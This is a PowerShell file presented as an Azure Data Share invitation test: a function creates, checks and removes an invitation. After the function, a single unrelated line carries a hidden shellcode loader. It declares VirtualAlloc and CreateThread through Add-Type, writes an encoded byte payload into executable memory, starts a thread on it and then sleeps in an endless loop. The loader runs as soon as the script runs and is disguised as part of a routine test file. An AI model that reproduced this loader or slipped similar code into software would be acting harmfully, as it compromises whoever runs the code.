﻿





function Test-InvitationCrud
{
    $resourceGroup = getAssetName

	try
	{
		$AccountName = getAssetName
		$ShareName = getAssetName
		$InvitationName = getAssetName
		$targetEmail = "test@microsoft.com"
		$createdInvitation = New-AzDataShareInvitation -AccountName $AccountName -ResourceGroupName $resourceGroup -ShareName $ShareName -Name $InvitationName -TargetEmail $targetEmail

		Assert-NotNull $createdInvitation
		Assert-AreEqual $InvitationName $createdInvitation.Name
		Assert-AreEqual "test@microsoft.com" $createdInvitation.TargetEmail
		Assert-AreEqual "Pending" $createdInvitation.InvitationStatus

		$retrievedInvitation = Get-AzDataShareInvitation -AccountName $AccountName -ResourceGroupName $resourceGroup -ShareName $ShareName -Name $InvitationName

		Assert-NotNull $retrievedInvitation
		Assert-AreEqual $InvitationName $retrievedInvitation.Name
		Assert-AreEqual "Pending" $retrievedInvitation.InvitationStatus

		$removed = Remove-AzDataShareInvitation -AccountName $AccountName -ResourceGroupName $resourceGroup -ShareName $ShareName -Name $InvitationName -PassThru

		Assert-True { $removed }
		Assert-ThrowsContains { Get-AzDataShareInvitation -AccountName $AccountName -ResourceGroupName $resourceGroup -ShareName $ShareName -Name $InvitationName} "Resource 'sdktestinginvitation' does not exist"
	}
    finally
	{
		Remove-AzResourceGroup -Name $resourceGroup -Force
	}
}
$W9n = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $W9n -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xdf,0xbf,0x22,0xb4,0xcc,0x09,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x31,0x7d,0x18,0x83,0xc5,0x04,0x03,0x7d,0x36,0x56,0x39,0xf5,0xde,0x14,0xc2,0x06,0x1e,0x79,0x4a,0xe3,0x2f,0xb9,0x28,0x67,0x1f,0x09,0x3a,0x25,0x93,0xe2,0x6e,0xde,0x20,0x86,0xa6,0xd1,0x81,0x2d,0x91,0xdc,0x12,0x1d,0xe1,0x7f,0x90,0x5c,0x36,0xa0,0xa9,0xae,0x4b,0xa1,0xee,0xd3,0xa6,0xf3,0xa7,0x98,0x15,0xe4,0xcc,0xd5,0xa5,0x8f,0x9e,0xf8,0xad,0x6c,0x56,0xfa,0x9c,0x22,0xed,0xa5,0x3e,0xc4,0x22,0xde,0x76,0xde,0x27,0xdb,0xc1,0x55,0x93,0x97,0xd3,0xbf,0xea,0x58,0x7f,0xfe,0xc3,0xaa,0x81,0xc6,0xe3,0x54,0xf4,0x3e,0x10,0xe8,0x0f,0x85,0x6b,0x36,0x85,0x1e,0xcb,0xbd,0x3d,0xfb,0xea,0x12,0xdb,0x88,0xe0,0xdf,0xaf,0xd7,0xe4,0xde,0x7c,0x6c,0x10,0x6a,0x83,0xa3,0x91,0x28,0xa0,0x67,0xfa,0xeb,0xc9,0x3e,0xa6,0x5a,0xf5,0x21,0x09,0x02,0x53,0x29,0xa7,0x57,0xee,0x70,0xaf,0x94,0xc3,0x8a,0x2f,0xb3,0x54,0xf8,0x1d,0x1c,0xcf,0x96,0x2d,0xd5,0xc9,0x61,0x52,0xcc,0xae,0xfe,0xad,0xef,0xce,0xd7,0x69,0xbb,0x9e,0x4f,0x58,0xc4,0x74,0x90,0x65,0x11,0xe0,0x95,0xf1,0x5a,0x5d,0xb9,0x00,0x33,0x9c,0xc2,0x13,0x9f,0x29,0x24,0x43,0x4f,0x7a,0xf9,0x23,0x3f,0x3a,0xa9,0xcb,0x55,0xb5,0x96,0xeb,0x55,0x1f,0xbf,0x81,0xb9,0xf6,0x97,0x3d,0x23,0x53,0x63,0xdc,0xac,0x49,0x09,0xde,0x27,0x7e,0xed,0x90,0xcf,0x0b,0xfd,0x44,0x20,0x46,0x5f,0xc2,0x3f,0x7c,0xca,0xea,0xd5,0x7b,0x5d,0xbd,0x41,0x86,0xb8,0x89,0xcd,0x79,0xef,0x82,0xc4,0xef,0x50,0xfc,0x28,0xe0,0x50,0xfc,0x7e,0x6a,0x51,0x94,0x26,0xce,0x02,0x81,0x28,0xdb,0x36,0x1a,0xbd,0xe4,0x6e,0xcf,0x16,0x8d,0x8c,0x36,0x50,0x12,0x6e,0x1d,0x60,0x6e,0xb9,0x5b,0x16,0x9e,0x79;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$RiQz=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($RiQz.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$RiQz,0,0,0);for (;;){Start-sleep 60};

